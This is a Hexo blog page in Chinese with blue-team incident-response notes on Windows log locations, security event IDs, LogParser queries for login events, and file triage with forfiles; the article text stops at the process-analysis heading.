@@ -1,0 +1,1158 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)","zh-CN":"复制成功 (*^▽^*)","zh-TW":"複製成功 (*^▽^*)","ja":"コピー成功 (*^▽^*)","pt-BR":"Copiado com sucesso (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ","zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ","zh-TW":"複製失敗 (ﾟ⊿ﾟ)ﾂ","ja":"コピー失敗 (ﾟ⊿ﾟ)ﾂ","pt-BR":"Falha ao copiar (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';window.REIMU_CONFIG.i18n_languages = ["en"];</script>
+  
+  <title>
+    蓝队应急响应 |
+    
+    mX1@0_blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="蓝队应急响应笔记#Windows排查日志分析在线日志筛选工具：https:&#x2F;&#x2F;tilipa.zlsam.com&#x2F;loger&#x2F; 日志分类Web日志 Web日志存放路径  Windows默认路径：在根目录下的logs文件夹中  tomcat日志  包含catalina.out（异常错误的日志）、localhost（类错误的日志）、manager、localhost_access_log 4种格式的日志">
+<meta property="og:type" content="article">
+<meta property="og:title" content="蓝队应急响应">
+<meta property="og:url" content="http://example.com/en/2025/04/10/lan-dui-ying-ji-xiang-ying/index.html">
+<meta property="og:site_name" content="mX1@0_blog">
+<meta property="og:description" content="蓝队应急响应笔记#Windows排查日志分析在线日志筛选工具：https:&#x2F;&#x2F;tilipa.zlsam.com&#x2F;loger&#x2F; 日志分类Web日志 Web日志存放路径  Windows默认路径：在根目录下的logs文件夹中  tomcat日志  包含catalina.out（异常错误的日志）、localhost（类错误的日志）、manager、localhost_access_log 4种格式的日志">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67f7cae788c538a9b5c8f67f.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67f7cb0388c538a9b5c8f6c1.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67f7cb1f88c538a9b5c8f6e5.png">
+<meta property="article:published_time" content="2025-04-10T13:40:32.779Z">
+<meta property="article:modified_time" content="2025-04-10T13:45:53.383Z">
+<meta property="article:author" content="mX1@0">
+<meta property="article:tag" content="应急响应">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67f7cae788c538a9b5c8f67f.png">
+  
+  
+  
+    <link rel="shortcut icon" href="/images/%E5%9B%BE1.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      
+      
+        
+      
+      <div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/en/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/en/archives">归类</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/en/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/en/friend">链接</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+    
+    
+  </nav>
+  
+    
+    <nav id="i18n-nav">
+      <div class="custom-dropdown">
+        <div class="select-selected" id="select-selected">
+          <span id="nav-language-btn" class="nav-icon" style="padding: 0 20px 0 0"></span>
+          <span id="selected-lang">English</span>
+        </div>
+        <ul class="select-items" id="select-items">
+          
+            <li data-value="zh-CN" >简体中文</li>
+          
+            <li data-value="en" class="selected">English</li>
+          
+        </ul>
+      </div>
+      <script>
+        var selectSelected = document.getElementById("select-selected");
+        var selectedLang = document.getElementById("selected-lang");
+        var selectItems = document.getElementById("select-items");
+        var selectOptions = selectItems.querySelectorAll("li");
+
+        selectSelected.addEventListener("click", () => {
+          selectItems.classList.toggle("show");
+        });
+
+        selectOptions.forEach((item) => {
+          item.addEventListener("click", () => {
+            const langMap = {};
+            
+              langMap['zh-CN'] = '/2025/04/10/lan-dui-ying-ji-xiang-ying/';
+            
+              langMap['en'] = '/en/2025/04/10/lan-dui-ying-ji-xiang-ying/';
+            
+            selectedLang.textContent = item.textContent;
+            selectItems.classList.remove("show");
+            selectOptions.forEach((option) => {
+              option.classList.remove("selected");
+            });
+            item.classList.add("selected");
+            window.location = langMap[item.dataset.value];
+          });
+        });
+
+        document.addEventListener("click", (event) => {
+          if (!event.target.closest(".custom-dropdown")) {
+            selectItems.classList.remove("show");
+          }
+        });
+      </script>
+    </nav>
+  
+</div>
+<header id="header">
+  
+    
+      
+        <picture></picture>
+        <img  fetchpriority="high" src="https://picsum.photos/1600/900?random=1" alt="蓝队应急响应">
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">蓝队应急响应</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%93%9D%E9%98%9F%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">蓝队应急响应笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E6%8E%92%E6%9F%A5"><span class="toc-number">1.1.</span> <span class="toc-text">#Windows排查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">1.1.1.</span> <span class="toc-text">日志分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%88%86%E7%B1%BB"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">日志分类</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Web%E6%97%A5%E5%BF%97"><span class="toc-number">1.1.1.1.1.</span> <span class="toc-text">Web日志</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97"><span class="toc-number">1.1.1.1.2.</span> <span class="toc-text">系统日志</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">1.1.2.</span> <span class="toc-text">文件分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.1.3.</span> <span class="toc-text">进程分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%90%AF%E5%8A%A8%E3%80%81%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.1.4.</span> <span class="toc-text">自启动、计划任务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E6%8E%92%E6%9F%A5"><span class="toc-number">1.2.</span> <span class="toc-text">#Linux排查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E7%9B%AE%E5%BD%95"><span class="toc-number">1.2.1.</span> <span class="toc-text">关键目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.2.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%B7%A5%E5%85%B7"><span class="toc-number">1.2.3.</span> <span class="toc-text">应急工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Busybox"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">Busybox</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unhide"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">unhide</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#chkrootkit"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">chkrootkit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Rkhunter"><span class="toc-number">1.2.3.4.</span> <span class="toc-text">Rkhunter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ClamAV"><span class="toc-number">1.2.3.5.</span> <span class="toc-text">ClamAV</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebShell%E6%9F%A5%E6%9D%80-%E6%B2%B3%E9%A9%AC"><span class="toc-number">1.2.3.6.</span> <span class="toc-text">WebShell查杀-河马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80-java-memshell-scanner"><span class="toc-number">1.2.3.7.</span> <span class="toc-text">内存马查杀-java-memshell-scanner</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-1"><span class="toc-number">1.2.4.</span> <span class="toc-text">日志分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#web%E6%97%A5%E5%BF%97"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">web日志</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97-1"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">系统日志</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90-1"><span class="toc-number">1.2.5.</span> <span class="toc-text">进程分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E7%8A%B6%E6%80%81"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">进程和网络连接状态</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.2.6.</span> <span class="toc-text">计划任务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">#流量分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Wireshark%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">1.3.1.</span> <span class="toc-text">Wireshark的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BD%91%E5%8D%A1%E9%80%89%E6%8B%A9%E6%A8%A1%E5%BC%8F"><span class="toc-number">1.3.1.0.1.</span> <span class="toc-text">网卡选择模式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.3.1.0.2.</span> <span class="toc-text">过滤器</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%AF%E6%BA%90%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.4.</span> <span class="toc-text">#溯源的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A5%E5%9C%BA%E5%89%8D%E6%9C%9F%E5%B7%A5%E4%BD%9C"><span class="toc-number">1.4.1.</span> <span class="toc-text">入场前期工作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%98%8E%E7%A1%AE%E7%BD%91%E7%BB%9C%E5%8C%BA%E5%9F%9F%E5%88%92%E5%88%86"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">1 明确网络区域划分</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%98%8E%E7%A1%AE%E7%8E%B0%E6%9C%89%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">2 明确现有安全设备</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%BE%E5%A4%87%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.4.1.2.1.</span> <span class="toc-text">设备类型</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%BE%E5%A4%87%E8%A6%86%E7%9B%96%E8%8C%83%E5%9B%B4"><span class="toc-number">1.4.1.2.2.</span> <span class="toc-text">设备覆盖范围</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%8E%B0%E6%9C%89%E5%91%8A%E8%AD%A6%E8%B4%A8%E9%87%8F"><span class="toc-number">1.4.1.2.3.</span> <span class="toc-text">现有告警质量</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%B7%B2%E6%9C%89%E8%B5%84%E4%BA%A7%E6%A2%B3%E7%90%86"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">3 已有资产梳理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%AC%E7%BD%91%E6%9A%B4%E9%9C%B2%E8%B5%84%E4%BA%A7"><span class="toc-number">1.4.1.3.1.</span> <span class="toc-text">公网暴露资产</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E8%B5%84%E4%BA%A7"><span class="toc-number">1.4.1.3.2.</span> <span class="toc-text">内网资产</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%85%AC%E5%8F%B8%E8%BF%90%E8%90%A5%E4%B8%9A%E5%8A%A1%E6%95%B0%E6%8D%AE%EF%BC%88%E9%98%B2%E9%92%93%E9%B1%BC%EF%BC%89"><span class="toc-number">1.4.1.4.</span> <span class="toc-text">4 公司运营业务数据（防钓鱼）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6"><span class="toc-number">1.4.2.</span> <span class="toc-text">溯源反制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E5%8A%A8%E8%AE%BF%E9%97%AE%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">主动访问扫描探测</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Web"><span class="toc-number">1.4.2.1.1.</span> <span class="toc-text">Web</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%88%86%E7%A0%B4"><span class="toc-number">1.4.2.1.2.</span> <span class="toc-text">爆破</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%83%85%E6%8A%A5%E6%90%9C%E9%9B%86"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">情报搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E3%80%81%E6%B2%99%E7%AE%B1"><span class="toc-number">1.4.2.2.1.</span> <span class="toc-text">威胁情报、沙箱</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E"><span class="toc-number">1.4.2.2.2.</span> <span class="toc-text">搜索引擎</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%98%BF%E9%87%8C%E4%BA%91%E3%80%81%E8%85%BE%E8%AE%AF%E4%BA%91%E3%80%81%E5%8D%8E%E4%B8%BA%E4%BA%91"><span class="toc-number">1.4.2.2.3.</span> <span class="toc-text">阿里云、腾讯云、华为云</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#IP%E5%AE%9A%E4%BD%8D"><span class="toc-number">1.4.2.2.4.</span> <span class="toc-text">IP定位</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/%E5%9B%BE1.jpg" data-sizes="auto" alt="mX1@0" class="lazyload">
+  <div class="sidebar-author-name">mX1@0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">64</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">18</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">25</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/archives" aria-label="归类"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归类</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/friend" aria-label="链接"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">链接</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+  
+</aside>
+
+          <section id="main"><article id="post-蓝队应急响应" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-04-10T13:40:32.779Z" itemprop="datePublished">2025-04-10</time>
+    <time style="display: none;" id="post-update-time">2025-04-10</time>
+  </span>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/en/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" data-aos="zoom-in">应急响应</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="蓝队应急响应笔记"><a href="#蓝队应急响应笔记" class="headerlink" title="蓝队应急响应笔记"></a>蓝队应急响应笔记</h1><h2 id="Windows排查"><a href="#Windows排查" class="headerlink" title="#Windows排查"></a>#Windows排查</h2><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>在线日志筛选工具：<a target="_blank" rel="noopener" href="https://tilipa.zlsam.com/loger/">https://tilipa.zlsam.com/loger/</a></p>
+<h4 id="日志分类"><a href="#日志分类" class="headerlink" title="日志分类"></a>日志分类</h4><h5 id="Web日志"><a href="#Web日志" class="headerlink" title="Web日志"></a>Web日志</h5><ol>
+<li>Web日志存放路径</li>
+</ol>
+<p>Windows默认路径：在根目录下的logs文件夹中</p>
+<ol start="2">
+<li>tomcat日志</li>
+</ol>
+<p>包含catalina.out（异常错误的日志）、localhost（类错误的日志）、manager、localhost_access_log 4种格式的日志</p>
+<ol start="3">
+<li>apache日志、nginx日志、IIS日志</li>
+</ol>
+<p>包含access_log、error_log</p>
+<h5 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h5><ol>
+<li>Windows系统日志包括系统日志、安全日志、应用日志等</li>
+</ol>
+<p>在事件查看器的 安全事件 中查看事件id</p>
+<table>
+<thead>
+<tr>
+<th align="center">敏感事件id</th>
+<th align="center">事件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">4624</td>
+<td align="center">登录成功</td>
+</tr>
+<tr>
+<td align="center">4625</td>
+<td align="center">登陆失败</td>
+</tr>
+<tr>
+<td align="center">4720</td>
+<td align="center">创建用户</td>
+</tr>
+<tr>
+<td align="center">4634</td>
+<td align="center">注销成功</td>
+</tr>
+<tr>
+<td align="center">4647</td>
+<td align="center">用户启动的注销</td>
+</tr>
+<tr>
+<td align="center">4672</td>
+<td align="center">使用超级用户/超级管理员用户进行登录</td>
+</tr>
+</tbody></table>
+<p>在事件查看器的 安全事件 中查看事件id</p>
+<p>​		当黑客创建了隐藏账户（hacker$），那么net user是无法查看的，可以去事件查看器中筛选查看事件id为4720的事件，查看是否创建了隐藏账户</p>
+<ol start="2">
+<li>系统日志分析工具–LogParser</li>
+</ol>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">登录成功的所有事件</span><br><span class="line">LogParser.exe -i:EVT -o:DATAGRID "SELECT * FROM Security.evtx（日志路径） where EventID=4624"</span><br><span class="line">指定登录时间范围的事件：</span><br><span class="line">LogParser.exe -i:EVT -o:DATAGRID "SELECT * FROM Security.evtx where TimeGenerated&gt;'2022-06-19 23:32:11' and TimeGenerated</span><br><span class="line">提取登录成功的用户名和IP：</span><br><span class="line">LogParser.exe -i:EVT -o:DATAGRID "SELECT EXTRACT_TOKEN(Message,13,') as</span><br><span class="line">EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,'|') as Username,EXTRACT_TOKEN(Message,38,'') as Loginip FROM Security.evtx where EventID=4624</span><br><span class="line">登陆失败的所有事件</span><br><span class="line">LogParser.exe -i:EVT -o:DATAGRID "SELECT * FROM Security.evtx where EventID=4625"</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><p>#文件排查</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(1)各个盘下的temp相关目录%temp%		//记录文件大，后缀为exe，dll等文件</span><br><span class="line">WIN+R	%temp%</span><br><span class="line"></span><br><span class="line">(2)开机启动文件（启动菜单、注册表</span><br><span class="line"></span><br><span class="line">(3)浏览器的历史记录</span><br><span class="line"></span><br><span class="line">(4)Recent文件</span><br><span class="line">WIN+R	recent</span><br><span class="line"></span><br><span class="line">(5）攻击日期内新增的文件,cmd下运行代码</span><br><span class="line">forfiles /m *.exe /d 2022/10/5 /s /c "cmd /c echo @path @fdate @ftime"</span><br><span class="line">		/m：指定类型	/d：指定时间之后</span><br><span class="line">		</span><br><span class="line">（8）使用工具D盾、HwsKill、WebshellKill等</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="进程分析"><a href="#进程分析" class="headerlink" title="进程分析"></a>进程分析</h3><p>#进程分析</p>
